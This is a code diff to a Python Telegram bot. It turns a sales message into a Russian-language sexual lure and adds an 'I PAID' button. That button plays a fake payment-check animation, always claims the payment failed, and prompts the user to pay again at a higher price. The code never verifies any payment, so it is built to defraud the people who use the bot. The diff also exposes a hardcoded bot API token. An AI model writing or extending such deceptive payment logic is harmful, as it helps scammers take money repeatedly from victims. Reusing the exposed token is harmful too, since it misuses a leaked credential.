@@ -4,6 +4,7 @@ import telebot
 from telebot import types
 from flask import Flask, request
 import threading
+import time
 
 TOKEN = "8211708885:AAGe2GJOiYBzLrJPTpayrl2DOPXc7Mbw1qs"
 
@@ -29,7 +30,7 @@ def save_user(message):
     }
 
 
-# ---------- УДАЛЕНИЕ ВСЕХ СООБЩЕНИЙ ----------
+# ---------- УДАЛЕНИЕ ----------
 def delete_last(chat_id):
     if chat_id in last_bot_messages:
         for msg_id in last_bot_messages[chat_id]:
@@ -116,7 +117,10 @@ def spam(message):
 
         msg = bot.send_message(
             user_id,
-            "Все еще хочешь купить яблок?",
+            """❤️ Любимый, хочешь посмотреть на меня?
+
+            🔞 Купи приветик и узнай что...
+            🏷️ У нас есть горячая скидочка для тебя 30%!!!""",
             reply_markup=markup
         )
 
@@ -139,7 +143,7 @@ def callback(call):
 
     elif call.data == "month":
         msg = send_payment(chat_id, "299₽")
-        
+
     elif call.data == "forever1":
         msg = send_payment(chat_id, "6̶9̶9̶₽̶ 499₽ СКИДКА!!!")
 
@@ -149,6 +153,49 @@ def callback(call):
     elif call.data == "back":
         start(call.message)
         return
+
+    elif call.data == "retry":
+        msg = send_payment(chat_id, "699₽")
+
+    elif call.data == "cancel":
+        start(call.message)
+        return
+
+    elif call.data == "paid":
+
+        clocks = ["🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚"]
+
+        msg_anim = bot.send_message(chat_id, "🕛 Проверка платежа...")
+
+        for i in range(33):
+            try:
+                bot.edit_message_text(
+                    f"{clocks[i % len(clocks)]} Проверка платежа...",
+                    chat_id,
+                    msg_anim.message_id
+                )
+                time.sleep(0.3)
+            except:
+                pass
+
+        try:
+            bot.delete_message(chat_id, msg_anim.message_id)
+        except:
+            pass
+
+        markup = types.InlineKeyboardMarkup()
+
+        retry = types.InlineKeyboardButton("Повторить 🔁", callback_data="retry")
+        cancel = types.InlineKeyboardButton("Отмена ❌", callback_data="cancel")
+
+        markup.add(retry)
+        markup.add(cancel)
+
+        msg = bot.send_message(
+            chat_id,
+            "Извините, но платеж не прошел или пришла не вся сумма за выбранный тариф. 🙁\n\nПовторите платеж пожалуйста. 🙏",
+            reply_markup=markup
+        )
 
     else:
         return
@@ -176,6 +223,7 @@ https://t.me/+umjEbHsWQNMyMzJi"""
         )
     )
 
+    markup.add(types.InlineKeyboardButton("✅ Я ОПЛАТИЛ", callback_data="paid"))
     markup.add(types.InlineKeyboardButton("❌ Отменить", callback_data="back"))
 
     return bot.send_message(chat_id, text, reply_markup=markup)
